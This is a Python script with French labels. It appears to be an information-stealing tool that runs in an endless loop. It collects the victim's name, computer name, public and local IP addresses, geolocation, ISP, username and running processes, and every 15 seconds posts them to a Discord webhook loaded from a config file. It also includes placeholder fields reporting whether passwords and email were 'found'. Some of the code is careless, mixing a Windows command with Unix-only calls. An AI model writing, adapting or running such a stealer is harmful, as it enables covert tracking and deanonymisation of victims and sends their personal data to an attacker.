import os
import platform
import pwd
import random
import requests
import socket
import subprocess
import time
import json
import re
import platform


def load_webhook_from_json():
    with open('config/weedbok.json', 'r') as file:
        data = json.load(file)
        return data["weedbook"]

INTERVAL = 15
last_message_id = None

def get_ip_info(ip_address):
    try:
        response = requests.get(f"https://ipinfo.io/{ip_address}/json")
        response.raise_for_status()
        data = response.json()
        return data
    except requests.exceptions.RequestException as e:
        print("Failed to retrieve IP information:", e)
        return {}

def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org/?format=json")
        response.raise_for_status()
        data = response.json()
        return data["ip"]
    except requests.exceptions.RequestException as e:
        print("Failed to retrieve public IP:", e)
        return ""

def extract_name_and_surname():
    user_info = pwd.getpwuid(os.getuid())
    full_name = user_info.pw_gecos
    name, surname = full_name.split(',', 1)
    return name.strip(), surname.strip()

def send_to_discord(embed, webhook_url):
    global last_message_id

    payload = {"embeds": [embed]}

    try:
        response = requests.post(webhook_url, json=payload)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print("Failed to send message to Discord:", e)

def get_ping():
    try:
        response = subprocess.Popen(['ping', '-c', '1', 'google.com'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = response.communicate()
        if response.returncode == 0:
            lines = stdout.decode('utf-8').splitlines()
            for line in lines:
                if "time=" in line:
                    start_index = line.find("time=") + len("time=")
                    end_index = line.find(" ms", start_index)
                    ping_time = line[start_index:end_index]
                    return ping_time
        return "N/A"
    except subprocess.CalledProcessError:
        return "N/A"
    
def get_search_engine(browser_url):
    if "google.com" in browser_url:
        return "Google"
    elif "bing.com" in browser_url:
        return "Bing"
    elif "yahoo.com" in browser_url:
        return "Yahoo"
    elif "opera.com" in browser_url:
        return "Opera"
    elif "firefox.com" in browser_url:
        return "Firefox"
    else:
        return "Autre"
    
def check_microsoft_account():
    try:
        result = subprocess.run(['net', 'user'], capture_output=True, text=True)
        output = result.stdout

        if "MicrosoftAccount" in output:
            return True
        else:
            return False
    except Exception as e:
        print("Une erreur s'est produite lors de la vérification du compte Microsoft:", e)
        return False
    

def main():
    while True:
        WEBHOOK_URL = load_webhook_from_json()
        microsoft_account_present = check_microsoft_account()
        name, surname = extract_name_and_surname()
        pc_name = platform.node()
        public_ip = get_public_ip()
        ip_info = get_ip_info(public_ip)
        local_ip = socket.gethostbyname(socket.gethostname())
        username = pwd.getpwuid(os.getuid()).pw_name
        ping_time = get_ping()
        search_engine = get_search_engine("https://www.google.com/search?q=test") 
        process = subprocess.Popen(['ps', '-eo', 'comm'], stdout=subprocess.PIPE)
        process_name = process.communicate()[0].decode('utf-8').strip()
        process_name = '\n'.join(process_name.splitlines()[:10])
        latitude = ip_info.get("loc", "N/A").split(",")[0]
        longitude = ip_info.get("loc", "N/A").split(",")[1]
        city = ip_info.get("city", "N/A")
        country = ip_info.get("country", "N/A")
        isp = ip_info.get("org", "N/A")
        mdp = False
        mail = False
        connected = False
        try:
            response = subprocess.check_output(['ping', '-c', '1', 'google.com'], stderr=subprocess.STDOUT)
            if '1 packets transmitted, 1 received' in response.decode('utf-8'):
                connected = True
        except subprocess.CalledProcessError:
            pass
        random_color = "%06x" % random.randint(0, 0xFFFFFF)
        os_name = platform.system()

        embed = {
            "title": "Informations sur l'utilisateur",
            "color": int(random_color, 16),
            "fields": [
                {"name": "Prénom de l'utilisateur", "value": name, "inline": True},
                {"name": "Nom de l'utilisateur", "value": name, "inline": True},
                {"name": "Nom du PC", "value": pc_name, "inline": True},
                {"name": "Adresse IP publique", "value": public_ip, "inline": True},
                {"name": "Latitude", "value": latitude, "inline": True},
                {"name": "Longitude", "value": longitude, "inline": True},
                {"name": "Ville", "value": city, "inline": True},
                {"name": "Pays", "value": country, "inline": True},
                {"name": "Fournisseur d'accès", "value": isp, "inline": True},
                {"name": "Adresse IP locale", "value": local_ip, "inline": True},
                {"name": "Nom d'utilisateur", "value": username, "inline": True},
                {"name": "Mots de passe", "value": "Trouver" if mdp else "Pas trouver", "inline": True},
                {"name": "Connecté", "value": "Oui" if connected else "Non", "inline": True},
                {"name": "Mail", "value": "Trouver" if mail else "Pas récupérer", "inline": True},
                {"name": "Système d'exploitation", "value": os_name, "inline": True},
                {"name": "Ping", "value": f"{ping_time} ms", "inline": True},
                {"name": "Moteur de recherche", "value": search_engine, "inline": True},
                {"name": "Processus en cours", "value": f"```{process_name}```"},
            ]
        }

        send_to_discord(embed, WEBHOOK_URL)

        time.sleep(INTERVAL)

if __name__ == "__main__":
    main()

